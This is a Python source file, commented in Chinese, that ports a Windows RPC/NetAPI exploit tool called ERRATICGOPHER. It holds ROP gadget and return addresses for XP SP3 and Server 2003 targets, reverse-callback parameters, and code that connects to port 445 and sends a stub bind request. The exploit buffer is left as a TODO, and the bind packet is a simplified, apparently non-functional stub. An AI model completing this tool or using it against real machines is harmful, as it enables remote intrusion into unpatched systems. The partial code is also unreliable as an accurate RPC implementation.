"""erratic_gopher — ERRATICGOPHER RPC 利用核心逻辑。

Python 重写的 `Erraticgopher-1.0.1.exe` (C++ / DAVE framework)。
通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 RPC/NetAPI 利用流程。

参数定义来源：Erraticgopher-1.0.1.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 445
DEFAULT_CONNECTION_DIRECTION = 0  # 0 = Reverse callback

# 各目标 OS 的 ROP gadget 地址（来自 XML <Target><paramgroup>）
TARGET_OS_GADGETS = {
    "XPSP3": {
        "EggOffset":        0xE4,
        "RsaenhBase":       0x68000000,
        "MaxEggSize":       0x0690,
        "LockStackOffset":  0x0190,
        "InitialRetAddr":   0x00014E7A,
        "RwAddress":        0x00032020,
        "ZeroEax":          0x000121DE,
        "MovEspEax":        0x00014F88,
        "StoreEaxEcx":      0x0001137E,
        "SkipJunk":         0x00015EA3,
        "SkipJunkPadding":  0x0000000C,
        "GetVProtIndex":    0x0000A965,
        "vProtIndex":       0x00000089,
        "vProtPadding":     0x0000000C,
        "SetupEbx":         0x00015EA5,
        "SysCallAddr":      0x7FFE0300,
        "JumpEbx":          0x00011740,
        "JumpEbxPadding":   0x00000010,
        "Ret14":            0x0000692D,
        "JumpEsp":          0x00011899,
    },
    "W2K3SP0": {
        "EggOffset":        0x28,
        "RsaenhBase":       0x0,
        "MaxEggSize":       0x06B0,
        "LockStackOffset":  0x00E0,
        "InitialRetAddr":   0x0FFEF4C9,
    },
    "W2K3SP1": {
        "EggOffset":        0xC4,
        "RsaenhBase":       0x68000000,
        "MaxEggSize":       0x06B0,
        "LockStackOffset":  0x0170,
        "InitialRetAddr":   0x00015BD8,
        "RwAddress":        0x0002BA08,
        "ZeroEax":          0x00012CE6,
        "MovEspEax":        0x00015CF4,
        "StoreEaxEcx":      0x00011EB9,
        "SkipJunk":         0x00015D8B,
        "GetVProtIndex":    0x000092A1,
        "vProtIndex":       0x0000008F,
        "vProtPadding":     0x00000008,
        "SetupEbx":         0x00015D8D,
        "SysCallAddr":      0x7FFE0300,
        "JumpEbx":          0x0001227B,
        "Ret14":            0x0000694E,
        "JumpEsp":          0x000123D4,
    },
    "W2K3SP2": {
        "EggOffset":        0xC4,
        "RsaenhBase":       0x68000000,
        "MaxEggSize":       0x06B0,
        "LockStackOffset":  0x0170,
        "InitialRetAddr":   0x00015F8B,
        "RwAddress":        0x000312C0,
        "ZeroEax":          0x00012F87,
        "MovEspEax":        0x000160A4,
        "StoreEaxEcx":      0x00012121,
        "SkipJunk":         0x0001613B,
        "GetVProtIndex":    0x00009391,
        "vProtIndex":       0x0000008F,
        "vProtPadding":     0x00000008,
        "SetupEbx":         0x0001613D,
        "SysCallAddr":      0x7FFE0300,
        "JumpEbx":          0x000124E3,
        "Ret14":            0x00009946,
        "JumpEsp":          0x0001263C,
    },
}


class ErraticGopherError(Exception):
    pass


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_rpc_bind_request():
    """构建 RPC 绑定请求（Bind PDU 到 NetAPI32 接口）。"""
    # RPC PDU header (simplified)
    pdu = (
        b"\x00\x00"          # alloc_hint
        b"\x00\x00"          # context_id
        b"\x00\x00"          # opnum
        b"\x00\x00\x00\x00"  # handle
        b"\x05\x00"          # RPC version
    )
    return pdu


def run_function(
    target,
    port=DEFAULT_PORT,
    connection_direction=DEFAULT_CONNECTION_DIRECTION,
    callback_ip=None,
    callback_port=None,
    target_os="XPSP3",
    verbose=False,
):
    """执行 ERRATICGOPHER 利用序列。

    当前阶段：完成参数解析、RPC 连接。
    具体 exploit 缓冲区（Egg 缓冲、ROP 链、InitialRetAddr、JumpEbx、JumpEsp、
    SysCallAddr 等）的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Connection direction: {connection_direction} "
              f"({'Reverse callback' if connection_direction == 0 else 'Forward callback'})")
        print(f"[*] Target OS: {target_os}")
        if connection_direction == 0:
            print(f"[*] Callback IP: {callback_ip}")
        print(f"[*] Callback port: {callback_port}")

    # 解析常量
    gadgets = TARGET_OS_GADGETS.get(target_os, TARGET_OS_GADGETS["XPSP3"])

    if verbose:
        print(f"[*] EggOffset: 0x{gadgets['EggOffset']:02X}")
        print(f"[*] MaxEggSize: 0x{gadgets['MaxEggSize']:03X}")
        print(f"[*] InitialRetAddr: 0x{gadgets['InitialRetAddr']:08X}")
        print(f"[*] JumpEbx: 0x{gadgets.get('JumpEbx', 0):08X}")
        print(f"[*] JumpEsp: 0x{gadgets.get('JumpEsp', 0):08X}")
        print(f"[*] SysCallAddr: 0x{gadgets.get('SysCallAddr', 0):08X}")

    # 建立 TCP 连接（RPC 445）
    try:
        sock = connect(target, port, timeout=60)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise ErraticGopherError(f"无法连接到 {target}:{port}: {exc}") from exc

    # 发送 RPC Bind 请求（探测阶段）
    bind_request = build_rpc_bind_request()
    try:
        sock.sendall(bind_request)
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise ErraticGopherError(f"RPC Bind 失败: {exc}") from exc

    if verbose:
        print(f"[*] RPC Bind 应答: {resp.hex()[:128]}...")

    sock.close()

    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
    #   - Egg 缓冲（EggOffset, MaxEggSize, RsaenhBase）
    #   - ROP 链（InitialRetAddr, RwAddress, ZeroEax, MovEspEax, StoreEaxEcx）
    #   - SkipJunk / SkipJunkPadding / SetupEbx
    #   - VirtualProtect 调用（GetVProtIndex, vProtIndex, vProtPadding）
    #   - Syscall（SysCallAddr, JumpEbx, JumpEbxPadding, Ret14, JumpEsp）
    #   - Egg 回连（CallbackIp, CallbackPort）

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
